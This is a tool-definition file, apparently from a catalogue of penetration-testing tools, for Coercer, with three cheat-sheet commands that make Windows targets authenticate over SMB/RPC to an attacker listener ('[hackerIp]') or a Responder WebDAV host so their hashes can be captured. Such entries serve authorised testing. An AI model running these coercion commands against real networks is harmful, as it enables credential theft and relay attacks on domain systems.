---
trust_level: community
id: darkiros-coercer
namespace: darkiros:tool:coercer
name: "coercer"
description: "Coercer - list vulns"
version: "1.0.0"
capabilities:
  - credential.discovery.reconnaissance
platforms:
  - cross-platform
techniques:
  - discovery
execution:
  template: "coercer"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "Coercer - list vulns"
    command: "coercer.py -d '[domain]' -u '[user]' -p '[password]' --listener [hackerIp] [targetIp]"
  - description: "Coercer - webdav"
    command: "coercer.py -d '[domain]' -u '[user]' -p '[password]' --webdav-host '[responder-machine-name]' [target-ip]"
  - description: "Coercer - list vulns many targets"
    command: "coercer.py -d '[domain]' -u '[user]' -p '[password]' --listener [hacker-ip] --target-file [target-file]"
references:
  - label: "Source"
    url: "https://github.com/p0dalirius/Coercer"
  - label: "Darkiros"
    url: "https://darkiros.github.io/commands.html"
items:
  - Hash
services:
  - SMB
  - RPC
---

# coercer

Darkiros cheat sheet commands:

**Coercer - list vulns**
```
coercer.py -d '[domain]' -u '[user]' -p '[password]' --listener [hackerIp] [targetIp]
```

**Coercer - webdav**
```
coercer.py -d '[domain]' -u '[user]' -p '[password]' --webdav-host '[responder-machine-name]' [target-ip]
```

**Coercer - list vulns many targets**
```
coercer.py -d '[domain]' -u '[user]' -p '[password]' --listener [hacker-ip] --target-file [target-file]
```
